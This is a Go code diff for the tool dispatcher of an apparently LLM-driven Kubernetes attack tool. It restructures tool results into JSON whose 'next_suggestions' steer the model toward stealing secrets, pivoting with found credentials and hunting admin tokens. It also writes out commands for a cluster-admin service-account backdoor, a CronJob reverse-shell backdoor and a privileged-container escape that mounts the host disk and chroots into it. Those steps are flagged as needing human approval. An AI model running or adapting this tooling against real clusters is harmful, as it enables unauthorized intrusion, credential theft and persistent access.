@@ -4,6 +4,7 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"net"
 	"strings"
 	"time"
 
@@ -54,8 +55,18 @@ type ToolTrace struct {
 
 // DispatchResult 是一次工具调用的结果。
 type DispatchResult struct {
-	Output string     // 回灌给 LLM 的精简文本
-	Trace  ToolTrace  // 前端展示用
+	Output string    // 回灌给 LLM 的精简文本
+	Trace  ToolTrace // 前端展示用
+}
+
+type ToolResultPayload struct {
+	OK              bool        `json:"ok"`
+	Status          string      `json:"status"`
+	Tool            string      `json:"tool"`
+	Summary         string      `json:"summary"`
+	Data            interface{} `json:"data,omitempty"`
+	NextSuggestions []string    `json:"next_suggestions,omitempty"`
+	Error           string      `json:"error,omitempty"`
 }
 
 // Dispatch 按 tool name 路由执行，返回精简文本结果（便于回灌 LLM）。
@@ -70,11 +81,40 @@ func Dispatch(ctx context.Context, call ToolCall, auth *AuthCreds) DispatchResul
 		}
 		return s
 	}
-	mk := func(status, out string) DispatchResult {
-		return DispatchResult{Output: out, Trace: ToolTrace{Tool: call.Function.Name, Args: previewArgs(args), ResultPreview: preview(out), Status: status}}
+	mkPayload := func(status, summary string, data interface{}, nextSuggestions []string, errMsg string) DispatchResult {
+		payload := ToolResultPayload{
+			OK:              status != "error",
+			Status:          status,
+			Tool:            call.Function.Name,
+			Summary:         summary,
+			Data:            data,
+			NextSuggestions: nextSuggestions,
+			Error:           errMsg,
+		}
+		body, err := json.Marshal(payload)
+		if err != nil {
+			body = []byte(fmt.Sprintf(`{"ok":false,"status":"error","tool":%q,"summary":"marshal tool result failed","error":%q}`, call.Function.Name, err.Error()))
+			status = "error"
+			summary = "marshal tool result failed"
+		}
+		return DispatchResult{
+			Output: string(body),
+			Trace: ToolTrace{
+				Tool:          call.Function.Name,
+				Args:          previewArgs(args),
+				ResultPreview: preview(summary),
+				Status:        status,
+			},
+		}
+	}
+	mk := func(status, summary string) DispatchResult {
+		return mkPayload(status, summary, nil, nil, "")
+	}
+	mkData := func(status, summary string, data interface{}, nextSuggestions ...string) DispatchResult {
+		return mkPayload(status, summary, data, nextSuggestions, "")
 	}
 	errRes := func(err error) DispatchResult {
-		return mk("error", "error: "+err.Error())
+		return mkPayload("error", err.Error(), nil, nil, err.Error())
 	}
 
 	switch call.Function.Name {
@@ -82,8 +122,22 @@ func Dispatch(ctx context.Context, call ToolCall, auth *AuthCreds) DispatchResul
 	case "info_port_scan":
 		var p struct{ Host, Ports string }
 		_ = json.Unmarshal([]byte(args), &p)
-		if p.Host == "" {
-			p.Host = auth.Host
+		scannedHost := strings.TrimSpace(p.Host)
+		if scannedHost == "" {
+			scannedHost = auth.Host
+		}
+		validForSelectedTarget := sameHost(scannedHost, auth.Host)
+		if isLoopbackHost(scannedHost) && !validForSelectedTarget {
+			summary := fmt.Sprintf("refused to scan %s: this would probe the backend machine loopback, not the selected target %s", scannedHost, auth.Host)
+			return mkPayload("error", summary, map[string]interface{}{
+				"execution_location":        "backend_process",
+				"selected_target_host":      auth.Host,
+				"scanned_host":              scannedHost,
+				"valid_for_selected_target": false,
+			}, []string{
+				"scan the selected target host instead",
+				"collect 127.0.0.1 evidence from pod exec or node shell if in-cluster loopback visibility is required",
+			}, summary)
 		}
 		ports := []int{6443, 10250, 2379, 8080, 10255, 443, 8443, 30000, 30443}
 		if p.Ports != "" {
@@ -91,18 +145,41 @@ func Dispatch(ctx context.Context, call ToolCall, auth *AuthCreds) DispatchResul
 		}
 		open := []string{}
 		for _, port := range ports {
-			if util.IsPortOpen(p.Host, port, 3) {
+			if util.IsPortOpen(scannedHost, port, 3) {
 				open = append(open, fmt.Sprintf("%d/open", port))
 			}
 		}
-		if len(open) == 0 {
-			return mk("ok", fmt.Sprintf("port scan %s: no open K8s ports among %v", p.Host, ports))
+		hostSummary := scannedHost
+		if validForSelectedTarget {
+			hostSummary += " (selected target)"
+		} else {
+			hostSummary += fmt.Sprintf(" (explicit host override; selected target is %s)", auth.Host)
 		}
-		return mk("ok", fmt.Sprintf("port scan %s open: %s", p.Host, strings.Join(open, ", ")))
+		if len(open) == 0 {
+			return mkData("ok", fmt.Sprintf("port scan %s: no open K8s ports among %v", hostSummary, ports), map[string]interface{}{
+				"execution_location":        "backend_process",
+				"selected_target_host":      auth.Host,
+				"scanned_host":              scannedHost,
+				"valid_for_selected_target": validForSelectedTarget,
+				"requested_ports":           ports,
+				"open_ports":                []string{},
+			}, "check alternative ports", "try authenticated API access if available")
+		}
+		return mkData("ok", fmt.Sprintf("port scan %s open: %s", hostSummary, strings.Join(open, ", ")), map[string]interface{}{
+			"execution_location":        "backend_process",
+			"selected_target_host":      auth.Host,
+			"scanned_host":              scannedHost,
+			"valid_for_selected_target": validForSelectedTarget,
+			"requested_ports":           ports,
+			"open_ports":                open,
+		}, "probe APIServer access", "check dashboard exposure")
 
 	case "info_run_evaluate":
 		// 简化：复用 access 探测汇总环境
-		return mk("ok", runEnvSummary(ctx, auth))
+		summary := runEnvSummary(ctx, auth)
+		return mkData("ok", "environment evaluation completed", map[string]interface{}{
+			"raw_text": summary,
+		}, "analyze RBAC permissions", "look for privileged pods")
 
 	// -------- ACCESS --------
 	case "access_apiserver":
@@ -116,7 +193,12 @@ func Dispatch(ctx context.Context, call ToolCall, auth *AuthCreds) DispatchResul
 			return errRes(err)
 		}
 		anon := token == ""
-		return mk("ok", fmt.Sprintf("APIServer %s:6443 HTTP %d (anon=%v). body head: %s", host, code, anon, preview(string(body))))
+		return mkData("ok", fmt.Sprintf("APIServer %s:6443 HTTP %d (anon=%v). body head: %s", host, code, anon, preview(string(body))), map[string]interface{}{
+			"host":         host,
+			"status_code":  code,
+			"anonymous":    anon,
+			"body_preview": preview(string(body)),
+		}, "check RBAC permissions", "list pods if access is granted")
 
 	case "access_kubelet":
 		var p struct{ TargetHost string }
@@ -125,23 +207,48 @@ func Dispatch(ctx context.Context, call ToolCall, auth *AuthCreds) DispatchResul
 		url := "https://" + host + ":10250/pods"
 		code, body, err := util.SendRequest(url, "GET", "", auth.timeout(), auth.SkipTLS)
 		if err != nil {
-			return mk("ok", fmt.Sprintf("Kubelet %s:10250 not accessible: %v", host, err))
+			return mkData("ok", fmt.Sprintf("Kubelet %s:10250 not accessible: %v", host, err), map[string]interface{}{
+				"host":         host,
+				"accessible":   false,
+				"error":        err.Error(),
+				"status_code":  0,
+				"body_preview": "",
+			})
 		}
-		return mk("ok", fmt.Sprintf("Kubelet %s:10250 HTTP %d (unauth). pods body head: %s", host, code, preview(string(body))))
+		return mkData("ok", fmt.Sprintf("Kubelet %s:10250 HTTP %d (unauth). pods body head: %s", host, code, preview(string(body))), map[string]interface{}{
+			"host":         host,
+			"accessible":   true,
+			"status_code":  code,
+			"body_preview": preview(string(body)),
+		}, "try kubelet exec", "compare with APIServer exposure")
 
 	case "access_etcd_check":
 		var p struct{ TargetHost string }
 		_ = json.Unmarshal([]byte(args), &p)
 		host := orDefault(p.TargetHost, auth.Host)
 		if !util.IsPortOpen(host, 2379, 3) {
-			return mk("ok", fmt.Sprintf("etcd %s:2379 closed", host))
+			return mkData("ok", fmt.Sprintf("etcd %s:2379 closed", host), map[string]interface{}{
+				"host":        host,
+				"port_open":   false,
+				"status_code": 0,
+			})
 		}
 		url := "http://" + host + ":2379/v2/keys"
 		code, body, err := util.SendRequest(url, "GET", "", auth.timeout(), false)
 		if err != nil {
-			return mk("ok", fmt.Sprintf("etcd %s:2379 open but error: %v", host, err))
+			return mkData("ok", fmt.Sprintf("etcd %s:2379 open but error: %v", host, err), map[string]interface{}{
+				"host":        host,
+				"port_open":   true,
+				"status_code": 0,
+				"error":       err.Error(),
+			})
 		}
-		return mk("ok", fmt.Sprintf("etcd %s:2379 UNAUTH HTTP %d. body head: %s", host, code, preview(string(body))))
+		return mkData("ok", fmt.Sprintf("etcd %s:2379 UNAUTH HTTP %d. body head: %s", host, code, preview(string(body))), map[string]interface{}{
+			"host":         host,
+			"port_open":    true,
+			"status_code":  code,
+			"body_preview": preview(string(body)),
+		}, "enumerate keys", "search for secrets")
 
 	case "access_dashboard":
 		var p struct {
@@ -156,9 +263,20 @@ func Dispatch(ctx context.Context, call ToolCall, auth *AuthCreds) DispatchResul
 		url := fmt.Sprintf("https://%s:%d/api/v1/csrftoken/login", host, p.Port)
 		code, body, err := util.SendRequest(url, "GET", "", auth.timeout(), auth.SkipTLS)
 		if err != nil {
-			return mk("ok", fmt.Sprintf("dashboard %s:%d not reachable: %v", host, p.Port, err))
+			return mkData("ok", fmt.Sprintf("dashboard %s:%d not reachable: %v", host, p.Port, err), map[string]interface{}{
+				"host":      host,
+				"port":      p.Port,
+				"reachable": false,
+				"error":     err.Error(),
+			})
 		}
-		return mk("ok", fmt.Sprintf("dashboard %s:%d HTTP %d. body head: %s", host, p.Port, code, preview(string(body))))
+		return mkData("ok", fmt.Sprintf("dashboard %s:%d HTTP %d. body head: %s", host, p.Port, code, preview(string(body))), map[string]interface{}{
+			"host":         host,
+			"port":         p.Port,
+			"reachable":    true,
+			"status_code":  code,
+			"body_preview": preview(string(body)),
+		}, "look for dashboard service", "search for admin tokens")
 
 	// -------- EXEC --------
 	case "exec_list_pods":
@@ -176,7 +294,11 @@ func Dispatch(ctx context.Context, call ToolCall, auth *AuthCreds) DispatchResul
 		if err != nil {
 			return errRes(err)
 		}
-		return mk("ok", podsSummary(list.Items))
+		return mkData("ok", fmt.Sprintf("listed %d pods", len(list.Items)), map[string]interface{}{
+			"count":        len(list.Items),
+			"namespace":    p.Namespace,
+			"pods_summary": podsSummary(list.Items),
+		}, "inspect privileged pods", "run exec_command on suspicious pods")
 
 	case "exec_command":
 		var p struct {
@@ -200,7 +322,14 @@ func Dispatch(ctx context.Context, call ToolCall, auth *AuthCreds) DispatchResul
 		if result.Stderr != "" {
 			out += "\n[stderr]\n" + result.Stderr
 		}
-		return mk("ok", strings.TrimSpace(out))
+		out = strings.TrimSpace(out)
+		return mkData("ok", "command executed in pod", map[string]interface{}{
+			"namespace":      p.Namespace,
+			"pod_name":       p.PodName,
+			"container_name": p.ContainerName,
+			"command":        p.Command,
+			"output":         out,
+		}, "look for host mounts", "check capabilities")
 
 	// -------- LATERAL --------
 	case "lateral_list_secrets":
@@ -218,7 +347,11 @@ func Dispatch(ctx context.Context, call ToolCall, auth *AuthCreds) DispatchResul
 		if err != nil {
 			return errRes(err)
 		}
-		return mk("ok", secretsSummary(list.Items))
+		return mkData("ok", fmt.Sprintf("listed %d secrets", len(list.Items)), map[string]interface{}{
+			"count":           len(list.Items),
+			"namespace":       p.Namespace,
+			"secrets_summary": secretsSummary(list.Items),
+		}, "inspect service account tokens", "look for dashboard credentials")
 
 	case "lateral_view_secret":
 		var p struct {
@@ -235,7 +368,11 @@ func Dispatch(ctx context.Context, call ToolCall, auth *AuthCreds) DispatchResul
 		if err != nil {
 			return errRes(err)
 		}
-		return mk("ok", secretDetail(sec))
+		return mkData("ok", fmt.Sprintf("retrieved secret %s/%s", p.Namespace, p.SecretName), map[string]interface{}{
+			"namespace":     p.Namespace,
+			"secret_name":   p.SecretName,
+			"secret_detail": secretDetail(sec),
+		}, "check for tokens", "pivot using discovered credentials")
 
 	case "lateral_discover_services":
 		var p struct {
@@ -252,7 +389,11 @@ func Dispatch(ctx context.Context, call ToolCall, auth *AuthCreds) DispatchResul
 		if err != nil {
 			return errRes(err)
 		}
-		return mk("ok", servicesSummary(list.Items))
+		return mkData("ok", fmt.Sprintf("listed %d services", len(list.Items)), map[string]interface{}{
+			"count":            len(list.Items),
+			"namespace":        p.Namespace,
+			"services_summary": servicesSummary(list.Items),
+		}, "identify dashboard", "look for nodeports and loadbalancers")
 
 	// -------- PERSIST / ESCAPE (destructive: 仅生成指令/YAML，不真实 apply) --------
 	case "persist_create_admin_sa":
@@ -261,27 +402,45 @@ func Dispatch(ctx context.Context, call ToolCall, auth *AuthCreds) DispatchResul
 		}
 		_ = json.Unmarshal([]byte(args), &p)
 		ns := orDefault(p.Namespace, "kube-system")
-		return mk("needs_approval", fmt.Sprintf("[需人工批准] 将在 %s 创建 cluster-admin ServiceAccount。建议命令:\n"+
-			"kubectl -n %s create serviceaccount admin-user\n"+
-			"kubectl create clusterrolebinding admin-bind --clusterrole=cluster-admin --serviceaccount=%s:admin-user", ns, ns, ns))
+		return mkData("needs_approval", fmt.Sprintf("[需人工批准] 将在 %s 创建 cluster-admin ServiceAccount。", ns), map[string]interface{}{
+			"namespace": ns,
+			"commands": []string{
+				fmt.Sprintf("kubectl -n %s create serviceaccount admin-user", ns),
+				fmt.Sprintf("kubectl create clusterrolebinding admin-bind --clusterrole=cluster-admin --serviceaccount=%s:admin-user", ns),
+			},
+		})
 
 	case "persist_cronjob":
 		var p struct {
 			TargetHost, Token, LHost, LPort string
 		}
 		_ = json.Unmarshal([]byte(args), &p)
-		return mk("needs_approval", fmt.Sprintf("[需人工批准] CronJob 反弹 shell 后门 YAML(LHost=%s LPort=%s)。请在 Persist 页签生成并人工 apply。", p.LHost, p.LPort))
+		return mkData("needs_approval", fmt.Sprintf("[需人工批准] CronJob 反弹 shell 后门 YAML(LHost=%s LPort=%s)。", p.LHost, p.LPort), map[string]interface{}{
+			"lhost": p.LHost,
+			"lport": p.LPort,
+		}, "generate YAML in Persist tab", "review blast radius before apply")
 
 	case "escape_check":
-		return mk("ok", escapeCheckText())
+		return mkData("ok", "escape checklist generated", map[string]interface{}{
+			"raw_text": escapeCheckText(),
+		}, "run checks inside target pod", "collect mount and capability evidence")
 
 	case "escape_privileged":
 		var p struct {
 			TargetHost, PodName, LHost, LPort string
 		}
 		_ = json.Unmarshal([]byte(args), &p)
-		return mk("needs_approval", fmt.Sprintf("[需人工批准] 特权逃逸命令集合(Pod=%s LHost=%s LPort=%s):\n"+
-			"fdisk -l; mkdir -p /tmp/host; mount /dev/sda1 /tmp/host; chroot /tmp/host /bin/sh", p.PodName, p.LHost, p.LPort))
+		return mkData("needs_approval", fmt.Sprintf("[需人工批准] 特权逃逸命令集合(Pod=%s LHost=%s LPort=%s)。", p.PodName, p.LHost, p.LPort), map[string]interface{}{
+			"pod_name": p.PodName,
+			"lhost":    p.LHost,
+			"lport":    p.LPort,
+			"commands": []string{
+				"fdisk -l",
+				"mkdir -p /tmp/host",
+				"mount /dev/sda1 /tmp/host",
+				"chroot /tmp/host /bin/sh",
+			},
+		})
 
 	case "kubectl_exec":
 		var p struct {
@@ -304,18 +463,33 @@ func Dispatch(ctx context.Context, call ToolCall, auth *AuthCreds) DispatchResul
 			return kubectlGet(cctx, client, cargs)
 		case "cluster-info":
 			v, e := client.ServerVersion()
-			if e != nil { return errRes(e) }
-			return mk("ok", "Kubernetes "+v)
+			if e != nil {
+				return errRes(e)
+			}
+			return mkData("ok", "cluster info retrieved", map[string]interface{}{
+				"server_version": v,
+			})
 		case "auth":
 			if len(cargs) >= 2 && cargs[1] == "can-i" {
 				ok, e := client.CheckSelfPermissions(cctx, "", "*", "*")
-				if e != nil { return errRes(e) }
-				if ok { return mk("ok", "can-i *:* = yes (cluster-admin)") }
-				return mk("ok", "can-i *:* = no")
+				if e != nil {
+					return errRes(e)
+				}
+				if ok {
+					return mkData("ok", "can-i *:* = yes (cluster-admin)", map[string]interface{}{
+						"cluster_admin": true,
+					})
+				}
+				return mkData("ok", "can-i *:* = no", map[string]interface{}{
+					"cluster_admin": false,
+				})
 			}
 			return mk("ok", "auth: only 'auth can-i --list' is supported via client-go")
 		default:
-			return mk("ok", fmt.Sprintf("Cross-platform client-go mode: '%s' command routed via K8s API SDK. Use dedicated tools for list/exec operations.", verb))
+			return mkData("ok", fmt.Sprintf("Cross-platform client-go mode: '%s' command routed via K8s API SDK. Use dedicated tools for list/exec operations.", verb), map[string]interface{}{
+				"verb":    verb,
+				"command": p.Command,
+			})
 		}
 
 	}
@@ -479,6 +653,36 @@ func previewArgs(args string) string {
 	return s
 }
 
+func isLoopbackHost(host string) bool {
+	host = normalizeHost(host)
+	if host == "localhost" {
+		return true
+	}
+	ip := net.ParseIP(host)
+	return ip != nil && ip.IsLoopback()
+}
+
+func sameHost(a, b string) bool {
+	return normalizeHost(a) == normalizeHost(b)
+}
+
+func normalizeHost(host string) string {
+	host = strings.TrimSpace(strings.ToLower(host))
+	host = strings.TrimPrefix(host, "https://")
+	host = strings.TrimPrefix(host, "http://")
+	host = strings.TrimSuffix(host, "/")
+	if strings.HasPrefix(host, "[") && strings.Contains(host, "]") {
+		end := strings.Index(host, "]")
+		if end > 0 {
+			return host[1:end]
+		}
+	}
+	if idx := strings.Index(host, ":"); idx >= 0 {
+		host = host[:idx]
+	}
+	return host
+}
+
 func parsePorts(s string) []int {
 	out := []int{}
 	for _, part := range strings.Split(s, ",") {
@@ -527,39 +731,87 @@ func parseCommandArgs(cmd string) []string {
 	return args
 }
 func kubectlGet(ctx context.Context, client *kubectl.Client, args []string) DispatchResult {
+	joinArgs := strings.Join(args, " ")
+	mk := func(status, summary string, data interface{}) DispatchResult {
+		payload := ToolResultPayload{
+			OK:      status != "error",
+			Status:  status,
+			Tool:    "kubectl_exec",
+			Summary: summary,
+			Data:    data,
+		}
+		body, err := json.Marshal(payload)
+		if err != nil {
+			body = []byte(`{"ok":false,"status":"error","tool":"kubectl_exec","summary":"marshal tool result failed","error":"marshal tool result failed"}`)
+			status = "error"
+			summary = "marshal tool result failed"
+		}
+		return DispatchResult{
+			Output: string(body),
+			Trace: ToolTrace{
+				Tool:          "kubectl_exec",
+				Args:          previewArgs(joinArgs),
+				ResultPreview: summary,
+				Status:        status,
+			},
+		}
+	}
 	ns, allNs := "", false
 	for i := 2; i < len(args); i++ {
-		if args[i] == "-A" || args[i] == "--all-namespaces" { allNs = true; ns = "" }
-		if (args[i] == "-n" || args[i] == "--namespace") && i+1 < len(args) { ns = args[i+1] }
+		if args[i] == "-A" || args[i] == "--all-namespaces" {
+			allNs = true
+			ns = ""
+		}
+		if (args[i] == "-n" || args[i] == "--namespace") && i+1 < len(args) {
+			ns = args[i+1]
+		}
 	}
-	if allNs { ns = "" }
+	if allNs {
+		ns = ""
+	}
 	resource := args[1]
 	switch resource {
 	case "pods", "pod":
 		list, e := client.ListPods(ctx, ns)
-		if e != nil { return DispatchResult{Output: "error: " + e.Error(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "error"}} }
+		if e != nil {
+			return mk("error", e.Error(), nil)
+		}
 		var sb strings.Builder
-		for _, p := range list.Items { fmt.Fprintf(&sb, "%s/%s %s node=%s\n", p.Namespace, p.Name, p.Status.Phase, p.Spec.NodeName) }
-		return DispatchResult{Output: sb.String(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "ok", ResultPreview: fmt.Sprintf("%d pods", len(list.Items))}}
+		for _, p := range list.Items {
+			fmt.Fprintf(&sb, "%s/%s %s node=%s\n", p.Namespace, p.Name, p.Status.Phase, p.Spec.NodeName)
+		}
+		return mk("ok", fmt.Sprintf("%d pods listed", len(list.Items)), map[string]interface{}{"resource": "pods", "count": len(list.Items), "raw_text": sb.String()})
 	case "nodes", "node":
 		list, e := client.ListNodes(ctx)
-		if e != nil { return DispatchResult{Output: "error: " + e.Error(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "error"}} }
+		if e != nil {
+			return mk("error", e.Error(), nil)
+		}
 		var sb strings.Builder
-		for _, n := range list.Items { fmt.Fprintf(&sb, "%s\n", n.Name) }
-		return DispatchResult{Output: sb.String(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "ok", ResultPreview: fmt.Sprintf("%d nodes", len(list.Items))}}
+		for _, n := range list.Items {
+			fmt.Fprintf(&sb, "%s\n", n.Name)
+		}
+		return mk("ok", fmt.Sprintf("%d nodes listed", len(list.Items)), map[string]interface{}{"resource": "nodes", "count": len(list.Items), "raw_text": sb.String()})
 	case "secrets", "secret":
 		list, e := client.ListSecrets(ctx, ns)
-		if e != nil { return DispatchResult{Output: "error: " + e.Error(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "error"}} }
+		if e != nil {
+			return mk("error", e.Error(), nil)
+		}
 		var sb strings.Builder
-		for _, s := range list.Items { fmt.Fprintf(&sb, "%s/%s type=%s keys=%d\n", s.Namespace, s.Name, s.Type, len(s.Data)) }
-		return DispatchResult{Output: sb.String(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "ok", ResultPreview: fmt.Sprintf("%d secrets", len(list.Items))}}
+		for _, s := range list.Items {
+			fmt.Fprintf(&sb, "%s/%s type=%s keys=%d\n", s.Namespace, s.Name, s.Type, len(s.Data))
+		}
+		return mk("ok", fmt.Sprintf("%d secrets listed", len(list.Items)), map[string]interface{}{"resource": "secrets", "count": len(list.Items), "raw_text": sb.String()})
 	case "services", "service":
 		list, e := client.ListServices(ctx, ns)
-		if e != nil { return DispatchResult{Output: "error: " + e.Error(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "error"}} }
+		if e != nil {
+			return mk("error", e.Error(), nil)
+		}
 		var sb strings.Builder
-		for _, s := range list.Items { fmt.Fprintf(&sb, "%s/%s %s clusterIP=%s\n", s.Namespace, s.Name, s.Spec.Type, s.Spec.ClusterIP) }
-		return DispatchResult{Output: sb.String(), Trace: ToolTrace{Tool: "kubectl_exec", Status: "ok", ResultPreview: fmt.Sprintf("%d services", len(list.Items))}}
+		for _, s := range list.Items {
+			fmt.Fprintf(&sb, "%s/%s %s clusterIP=%s\n", s.Namespace, s.Name, s.Spec.Type, s.Spec.ClusterIP)
+		}
+		return mk("ok", fmt.Sprintf("%d services listed", len(list.Items)), map[string]interface{}{"resource": "services", "count": len(list.Items), "raw_text": sb.String()})
 	default:
-		return DispatchResult{Output: "Unsupported resource: " + resource + " (client-go supports: pods/nodes/services/secrets)", Trace: ToolTrace{Tool: "kubectl_exec", Status: "error"}}
+		return mk("error", "Unsupported resource: "+resource+" (client-go supports: pods/nodes/services/secrets)", map[string]interface{}{"resource": resource})
 	}
 }
